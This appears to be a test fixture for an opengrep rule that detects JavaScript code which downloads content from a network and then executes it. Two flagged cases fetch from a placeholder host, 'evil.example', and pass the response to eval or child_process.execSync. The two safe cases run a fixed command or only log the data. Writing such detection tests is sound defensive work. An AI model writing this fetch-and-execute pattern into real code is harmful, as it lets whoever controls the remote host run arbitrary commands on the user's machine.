// opengrep --test fixtures for js_net_to_exec.
// Lines tagged `ruleid:` MUST match; `ok:` MUST NOT.

const cp = require("child_process");
const https = require("https");

async function bad1() {
  const res = await fetch("https://evil.example/payload");
  const body = await res.text();
  // ruleid: js_net_to_exec
  eval(body);
}

function bad2() {
  https.get("https://evil.example/cmd", (r) => {
    let data = "";
    r.on("data", (c) => (data += c));
    r.on("end", () => {
      // ruleid: js_net_to_exec
      cp.execSync(data);
    });
  });
}

function ok1() {
  // ok: js_net_to_exec
  cp.execSync("node-gyp rebuild");
}

async function ok2() {
  const res = await fetch("https://registry.example/meta.json");
  // ok: js_net_to_exec
  console.log(await res.json());
}
